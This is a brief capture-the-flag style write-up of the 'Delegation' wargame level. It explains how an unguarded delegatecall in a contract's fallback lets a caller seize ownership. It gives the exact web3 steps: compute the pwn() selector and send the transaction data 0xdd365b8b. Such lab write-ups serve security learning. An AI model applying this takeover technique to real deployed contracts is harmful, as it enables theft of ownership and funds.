# Delegation

The goal of this level is for you claim ownership of the instance you are given.

## Solution

`delecatecall` allows us to [call contracts with the state of the caller](https://solidity.readthedocs.io/en/v0.5.3/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries). We can trigger the fallback function to call a remote function that manipulates the contracts own state!

1. Got the hash of the `pwn` method with `web3.sha3("pwn()").slice(0, 10)`
2. Triggered the falback method to call the `pwn` method with `contract.sendTransaction({ data: "0xdd365b8b" })`
